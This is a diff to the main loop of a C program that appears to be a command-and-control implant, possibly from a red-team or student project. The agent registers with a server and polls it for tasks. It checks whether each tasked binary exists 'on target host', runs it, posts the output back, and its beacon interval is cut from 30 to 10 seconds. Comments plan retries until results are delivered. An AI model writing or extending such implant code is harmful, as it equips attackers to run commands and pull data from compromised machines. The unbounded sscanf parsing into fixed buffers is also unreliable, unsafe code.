@@ -45,6 +45,8 @@ int main(void)
     puts("Made it out of reg\n");
     printf("UUID in main is %s", agent.uuid);
 
+    create_tasks_url(sa.response, &agent);
+
     while(true) {
         puts("Checking tasks\n");
         if(!check_tasks(&agent, &sa)) {
@@ -56,11 +58,11 @@ int main(void)
             continue;
         }
 
-        // char line[1024] = { '\0' };
+        // Begin iterating through task.strings array and extracting task ID
+        // task type, task cmd, and args to then call follow on task execution
+        // functions.
         for (unsigned int i = 0; i < task.sz; i++) {      
 
-
-            //*** UPDATE THIS TO USE STRTOK. SCANF CANNOT BE USED, AS THERE IS AN UNKNOWN
             // Ref for scanning remainder of string (%[\001-\377]):
             // https://stackoverflow.com/questions/35101996/sscanf-get-the-value-of-the-remaining-string
             sscanf(task.strings[i], "%s %s %s %[\001-\377]", task.id, task.type, task.cmd, task.args);
@@ -70,28 +72,36 @@ int main(void)
             printf("Tasks Arg: %s\n", task.args);
             puts(" \n");
             // Eventually check_tasks will return the task type and
-            // specific task. An if block will be added here to
-            // check if task type is cmd, if so, run the cmd commands.
+            // specific task. An if block or switch case will be added
+            // here to call appropriate functions for a given task type.
+
+            // Check to see if binary exists on target host.
             if(can_run_cmd(task.cmd)) {
                 puts("Command exists\n");
                 if(run_cmd(&sa, &task)) {
-                    // printf("%s", sa.words);
+                    // Eventually will need to include logic if results can't be posted,
+                    // to retain data continuously attempt to re-post until successful.
                     post_results(&sa);
+                } else {
+                    printf("Unable to execute command %s\n", task.cmd);
+                    // Will need to include logic to post unsuccessful results.
+                    // Memset task values.
+                    memset_task_vals(&task);
+                    continue;
                 }
 
             } else {
                 puts("Command does not exist\n");
+                // Will need to include logic to post unsuccessful results.
+                // Memset task values.
+                memset_task_vals(&task);
                 continue;
-
-
             }
 
+            // After executing each task, memset all values to execute
+            // next task.
+            memset_task_vals(&task);
 
-
-            memset(task.id, 0, sizeof(task.id));
-            memset(task.type, 0, sizeof(task.type));
-            memset(task.cmd, 0, sizeof(task.cmd));
-            memset(task.args, 0, sizeof(task.args));
 
         }
 
@@ -105,7 +115,7 @@ int main(void)
 
 
 
-        sleep(30);
+        sleep(10);
     }
         
 }
